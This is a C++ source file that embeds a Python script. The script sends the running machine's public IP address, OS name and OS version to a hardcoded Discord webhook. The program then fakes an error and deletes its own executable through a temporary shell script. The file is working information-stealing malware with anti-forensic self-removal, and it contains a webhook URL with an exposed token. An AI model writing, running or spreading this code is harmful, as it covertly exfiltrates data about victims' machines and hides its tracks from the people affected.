#include <iostream>
#include <Python.h>
#include <cstdlib>
#include <stdexcept>
#include <unistd.h>
#include <limits.h>
#include <string>
#include <sys/stat.h>
#include <fcntl.h>

// Self-deletion function
void selfDelete()
{
    char exePath[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
    if (len == -1)
    {
        perror("readlink");
        exit(EXIT_FAILURE);
    }
    exePath[len] = '\0';

    std::string script =
        "#!/bin/sh\n"
        "rm -f \"" + std::string(exePath) + "\"\n"
        "rm -f \"$0\"\n";
    char scriptPath[] = "/tmp/selfdel_thatfileXXXXXX";
    int fd = mkstemp(scriptPath);
    if (fd == -1)
    {
        perror("mkstemp");
        exit(EXIT_FAILURE);
    }
    write(fd, script.c_str(), script.size());
    close(fd);
    chmod(scriptPath, 0700);
    if (fork() == 0)
    {
        execl("/bin/sh", "sh", scriptPath, (char *)NULL);
        perror("execl");
        _exit(EXIT_FAILURE);
    }
    exit(EXIT_SUCCESS);
}

// zmiq class
class zmiq
{
public:
    void snakes();
};

void zmiq::snakes()
{
    Py_Initialize();
    if (!Py_IsInitialized())
    {
        std::cerr << "Python wasn't Initialized(Type shit)" << std::endl;
        return;
    }
    const char *koda =
        "import requests\n"
        "import public_ip as ip\n"
        "import platform\n"
        "if __name__ == '__main__':\n"
        "    webhook_url = 'https://discordapp.com/api/webhooks/1394813521208021085/6_xQD-wAYr4DZ9HaEHUH0ddsDm7CKYa5qygg6zVTh0p2ex8pnWSwE4xBmbcBvl63o4kE'\n"
        "    output = '✅ Script finished successfully!'\n"
        "    public_ip = ip.get()\n"
        "    machine = 'OS Name: ' + platform.system() + '\\n' + 'OS Version: ' + platform.platform()\n"
        "    data = {\n"
        "        'content': f'{output}\\n{public_ip}\\n{machine}'\n"
        "    }\n"
        "    response = requests.post(webhook_url, json=data)\n"
        "    if response.status_code == 204:\n"
        "        print('Message sent to Discord!')\n"
        "    else:\n"
        "        print(f'Failed to send message: {response.status_code}')\n";
    int result = PyRun_SimpleString(koda);
    if (result != 0)
    {
        std::cerr << "There is an error, fix it!!" << std::endl;
        PyErr_Print();
    }
    Py_Finalize();
}

int main()
{
    try
    {
        zmiq myObj;
        myObj.snakes();
        bool errorCondition = true;
        if (errorCondition)
        {
            throw std::runtime_error("There is an error");
        }
    }
    catch (const std::exception &e)
    {
        std::cerr << "Error: " << e.what() << std::endl;
        selfDelete();
    }
    return 0;
}
